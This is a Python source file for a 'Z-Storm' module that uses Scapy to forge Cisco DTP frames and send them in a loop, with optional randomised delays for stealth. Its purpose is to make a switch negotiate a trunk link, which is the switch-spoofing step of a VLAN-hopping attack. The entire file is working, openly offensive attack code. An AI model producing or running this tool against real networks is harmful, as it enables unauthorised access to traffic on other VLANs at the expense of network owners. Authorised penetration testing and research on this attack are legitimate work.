#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
DTP Spoofing Module for Z-Storm
Used for Switch Spoofing attacks
"""

import time
import random
import threading
import logging
from typing import Optional, Dict, List

try:
    from scapy.all import (
        Ether, Dot3, LLC, SNAP, sendp, get_if_hwaddr, conf
    )
    from scapy.contrib.dtp import (
    DTP,
    DTPDomain,
    DTPStatus,
    DTPType,
    DTPNeighbor
)
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[!] Scapy not installed. Run: pip install scapy")


class DTPSpoofer:
    """
    DTP Spoofing class for Switch Spoofing attacks
    Sends DTP packets to negotiate trunk links
    """
    
    def __init__(self, interface: str, config: Dict):
        """
        Initialize DTP Spoofer
        
        Args:
            interface: Network interface to use
            config: Configuration dictionary
        """
        self.interface = interface
        self.config = config
        self.running = False
        self.paused = False
        self.logger = logging.getLogger('ZStorm.DTPSpoofer')
        
        try:
            self.attacker_mac = get_if_hwaddr(interface)
        except:
            self.attacker_mac = "00:00:00:00:00:00"
        
        # DTP Configuration
        self.target_mac = config.get('target_mac', "01:00:0c:cc:cc:cc")
        self.interval = config.get('interval', 5.0)
        self.domain = config.get('domain', 'z-storm-vlan')
        self.status = config.get('status', 0x03)
        self.vtp = config.get('vtp', 0x01)
        self.neighbor = config.get('neighbor', 0x01)
        self.negotiate_desirable = config.get('negotiate_desirable', True)
        self.vlan_range = config.get('vlan_range', '1-4094')
        
        # Statistics
        self.stats = {
            'packets_sent': 0,
            'start_time': None,
            'end_time': None,
            'duration': 0
        }
        
        self.logger.info(f"DTP Spoofer initialized on {interface}")
        self.logger.info(f"Target MAC: {self.target_mac}")
        self.logger.info(f"Domain: {self.domain}")
    
    def create_dtp_packet(self) -> Ether:
        """
        Create a DTP packet with configurable fields
        
        Returns:
            Ether packet with DTP layer
        """
        # Build DTP packet
        ether = Ether(dst=self.target_mac, src=self.attacker_mac)
        dot3 = Dot3()
        llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
        snap = SNAP(OUI=0x00000c, code=0x2004)
        
        # DTP layer
        dtp = DTP(
            version=1,
            domain=self.domain.encode() if isinstance(self.domain, str) else self.domain,
            status=self.status,
            vtp=self.vtp,
            neighbor=self.neighbor
        )
        
        return ether / dot3 / llc / snap / dtp
    
    def start(self):
        """
        Start DTP Spoofing attack
        """
        if not SCAPY_AVAILABLE:
            self.logger.error("Scapy not available")
            return
        
        self.running = True
        self.stats['start_time'] = time.time()
        self.logger.warning(f"Starting DTP Spoofing attack on {self.interface}")
        self.logger.warning(f"Sending DTP packets to {self.target_mac}")
        
        try:
            while self.running:
                if self.paused:
                    time.sleep(0.1)
                    continue
                
                # Create and send DTP packet
                packet = self.create_dtp_packet()
                sendp(packet, iface=self.interface, verbose=False)
                self.stats['packets_sent'] += 1
                
                # Log every 10 packets
                if self.stats['packets_sent'] % 10 == 0:
                    elapsed = time.time() - self.stats['start_time']
                    rate = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
                    self.logger.info(f"DTP packets sent: {self.stats['packets_sent']} | Rate: {rate:.2f}/s")
                
                # Random delay for stealth
                if self.config.get('randomize_delay', False):
                    delay = self.interval * random.uniform(0.8, 1.2)
                else:
                    delay = self.interval
                
                time.sleep(delay)
                
        except KeyboardInterrupt:
            self.logger.info("DTP Spoofing interrupted by user")
        except Exception as e:
            self.logger.error(f"Error in DTP Spoofing: {e}")
        finally:
            self.stop()
    
    def stop(self):
        """
        Stop DTP Spoofing attack
        """
        self.running = False
        self.stats['end_time'] = time.time()
        self.stats['duration'] = self.stats['end_time'] - self.stats['start_time']
        self.logger.info(f"DTP Spoofing stopped. Packets sent: {self.stats['packets_sent']}")
        self.logger.info(f"Duration: {self.stats['duration']:.2f}s")
    
    def pause(self):
        """Pause the attack"""
        self.paused = True
        self.logger.info("DTP Spoofing paused")
    
    def resume(self):
        """Resume the attack"""
        self.paused = False
        self.logger.info("DTP Spoofing resumed")
    
    def get_stats(self) -> Dict:
        """Get current statistics"""
        return self.stats
    
    def configure(self, **kwargs):
        """
        Dynamically configure DTP parameters
        
        Args:
            **kwargs: Configuration parameters to update
        """
        for key, value in kwargs.items():
            if hasattr(self, key):
                setattr(self, key, value)
                self.logger.info(f"Updated {key} to {value}")
            else:
                self.logger.warning(f"Unknown parameter: {key}")
    
    def send_burst(self, count: int = 5, delay: float = 0.1):
        """
        Send a burst of DTP packets
        
        Args:
            count: Number of packets to send
            delay: Delay between packets in seconds
        """
        self.logger.info(f"Sending burst of {count} DTP packets")
        
        for i in range(count):
            if not self.running:
                break
            
            packet = self.create_dtp_packet()
            sendp(packet, iface=self.interface, verbose=False)
            self.stats['packets_sent'] += 1
            
            if i < count - 1:
                time.sleep(delay)
        
        self.logger.info(f"Burst complete. Total: {self.stats['packets_sent']}")
